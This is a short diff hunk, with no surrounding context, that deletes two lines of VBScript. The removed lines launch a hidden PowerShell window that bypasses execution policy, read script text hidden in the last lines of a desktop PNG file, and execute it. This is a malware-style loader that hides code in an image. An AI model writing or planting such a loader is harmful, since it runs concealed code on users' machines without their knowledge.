@@ -1,2 +1,0 @@
-set onetwo = wscript.createobject ("wscript.shell")
-onetwo.run "powershell -win 1 -nop -exec bypass $anyfile = get-content $home\desktop\rowyaboat.png | select-object -last 5; $scriptblock = [system.management.automation.scriptblock]::create($anyfile); & $scriptblock;", 0, False
